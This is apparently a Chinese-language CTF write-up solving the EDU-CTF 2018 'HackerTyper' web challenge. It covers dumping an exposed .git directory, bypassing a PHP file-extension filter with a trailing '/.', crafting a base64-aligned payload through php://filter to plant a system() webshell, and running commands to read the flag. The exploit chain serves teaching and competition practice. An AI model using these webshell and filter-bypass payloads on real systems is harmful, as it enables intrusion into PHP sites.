---
uuid: 1d24c795
title: EDU-CTF 2018 - HackerTyper
tags:
  - writeup 
  - web
  - php
categories:
  - Capture The Flag
  - EDU-CTF 2018
date: 2019-02-01 00:00:00
updated: 2019-02-01 00:00:00
---

題目點進去會看到一個風格很 hacker 的網站，觀察 js 後發現什麼也沒有zzz

<!--more-->

# [正文]

透過簡單的測試發現它有 `.git`，卻沒有擋掉 `.git/*`，馬上用 `dvcs-ripper` 拉下來，checkout 後得到 source code!

{% codeblock lang:shell line_number:false %}
$ perl rip-git.pl -vv -o ./ -u http://final.kaibro.tw:10003/.git
[i] Downloading git files from http://final.kaibro.tw:10003/.git 
...
[i] Got items with git fsck: 0, Items fetched: 0
[!] No more items to fetch. That's it!

$ git log
...
commit c593e752192d5a2159bf8d9d00e639f8ada5deb5
Author: root <root@83a85fdd8851.(none)>
Date:   Thu Jan 10 21:56:36 2019 -0500

    update
...
$ git checkout c593e7521
...
HEAD is now at c593e75 update
$ ls
code.txt  index.php*  script.js  style.css
{% endcodeblock %}

{% codeblock index.php lang:php line_number:true %}
<?php

$sandbox = "/var/www/html/sandbox/" . md5($_SERVER['REMOTE_ADDR'] . "QQ");
@mkdir($sandbox);
@chdir($sandbox);

$path = 'code.txt';

if ( isset($_GET['_']) && isset($_GET['f']) ) {

    $_ = $_GET['_'];
    $f = $_GET['f'];

    if(preg_match("/h/is", pathinfo($f, PATHINFO_EXTENSION)))
        die("No h4cker will use h :p");

    $c = "Q____Q" . base64_encode($_);
    $path = 'sandbox/' . md5($_SERVER['REMOTE_ADDR'] . "QQ") . '/' . $f;

    @file_put_contents($f, $c);

}
?>

...
{% endcodeblock %}

## Analysis
1. 看到 `@file_put_contents($f, $c)`，推測用 `php://filter`
2. `$f` 會被 `preg_match("/h/is", pathinfo($f, PATHINFO_EXTENSION))` 過濾掉含 `h` 的副檔名，要 bypass WAF 的話，可以在後面加上 `/.` 讓 `pathinfo($f, PATHINFO_EXTENSION)` 回傳空字串，而 `@file_put_contents($f, $c)` 會忽略 `/.`
  {% note info %}
  ### PATHINFO_EXTENSION
  它會回傳最後一個 `.` 後面的內容當做副檔名，沒有東西的話會回傳空字串
  {% endnote %}
3. `$c` 是 `base64_encode($_) + "Q____Q"`，沒辦法簡單的 base64_decode，base64 是 4 char block 的，且 decode 會忽略非 base64 字元，利用此性質建構 payload:
  {% codeblock lang:plain line_number:false %}
  // generate payload
              |----|----|----|----|----|----|----|----|----|----|
  1. payload  |xxx |xxx |xxx |xxx |xxx |xxx |xxx |xxx |x   |    |
  2. encode   |aaaa|bbbb|cccc|dddd|eeee|ffff|gggg|hhhh|ii==|    |
  3. cut&add  |QQaa|aabb|bbcc|ccdd|ddee|eeff|ffgg|gghh|hhii|    |
  4. decode   |yyy |yyy |yyy |yyy |yyy |yyy |yyy |yyy |yyy |    |
  
  // by site index.php, Q____Q => QQ with base64 decode
              |----|----|----|----|----|----|----|----|----|----|
  5. encode   |QQaa|aabb|bbcc|ccdd|ddee|eeff|ffgg|gghh|hhii|    |
  6. addQQ    |QQQQ|aaaa|bbbb|cccc|dddd|eeee|ffff|gggg|hhhh|ii  |
  
  // by php://filter/convert.base64-decode
              |----|----|----|----|----|----|----|----|----|----|
  7. decode   |A?? |xxx |xxx |xxx |xxx |xxx |xxx |xxx |xxx |x   |
  {% endcodeblock %}
  
  {% note warning %}
  其中 2. 一定要找到 encode 完之後最後兩個為 `==` 的 payload，才能在步驟三把 `==` 消掉，並在前面加上任意兩個字元。
  {% endnote %}


## Gen Payload

{% codeblock lang:php line_number:true %}
<?php
$payload = '<?php system($_GET[0]);?>';

$payload = base64_encode($payload);
if ( strcmp( substr( $payload, -2 ), '==' ) ) {
    die( "Not good base64_encode: $payload" );
}

$payload = base64_decode( 'QQ' . substr( $payload, 0, -2 ) );
echo '_=' . urlencode($payload);
{% endcodeblock %}

## Get shell
將產生的 payload 放進 `$_GET["_"]`，且 `$_GET["f"]` = `php://filter`
{% codeblock Http request lang:plain line_number:false %}
http://final.kaibro.tw:10003/
GET _=${PAYLOAD}
    f=php://filter/convert.base64-decode/resource=webshell.php/.
{% endcodeblock %}

{% codeblock Http request lang:plain line_number:false %}
http://final.kaibro.tw:10003/sandbox/$(md5(IP))/webshell.php
GET 0=ls%20/
bin boot dev etc flag_is_in_it.php ...
GET 0=cat%20/flag_is_in_it.php
<?php
$s = "bY5dT8IwFIbv/RWjYWtryAIr4QbRZdx45Q16oQhnH2mriRk4GNEQ+O2eno0ICVdtn/e8z+ndQ1EXN13wJh6/jefBMX3nfMmX4j6NOikfY0RZEDVBejxRwmNEcfsmECOYnIAjgseLDsIweuQyRIxZTpN+sECu3hLp5gmy6csUawMDtlawUsbCb5ltP8qtgk1fQz1c/ygNX30Ahp3kit+p3F5T6F1mNwI3uq0QMt8wukHPM1br6lPgATq3AyW6pt5ZKSW125//p6vSVKMhVNk6/67QKMNWQLMoJW/TTpom6dsvsINv9s9PrzPWO5Ni5dIDtP8P";
eval(str_rot13(gzinflate(base64_decode($s))));
// find the flag!
{% endcodeblock %}

不知道為啥，evel 會壞掉，只好 `echo str_rot13(gzinflate(base64_decode($s)))` 得到：
{% codeblock lang:php line_number:true %}
<?php
$_ = '*@[&~`\''^'^(>`2!`';
$__ = '&2`\''^'`~!`';
$___ = ';'^'@';
$____ = '@'^'=';
$_____ = ('@]!'^'.2U').$__;
$o = '@%&]'^'3MO)';
$$o = "PHP___1s_th3_b3st_languag3_f0r_h4ck3r_y0__";
$O = ('@]!'^'.2U').$_;
$$_ = sprintf($__.$___."%s".$____, strrev(str_rot13($shit)));
$$_____ = str_rot13(base64_encode($_).strrev($____.$_.$___));
$$O = strrev(sprintf("}%s{GALF", str_rot13($__).strrev($_____)));
{% endcodeblock %}

仔細觀察後發現 `$$_` 就是 flag 了！

FLAG: `FLAG{__0l_e3xp4u_e0s_3tnhtany_gf3o_3ug_f1___CUC}`
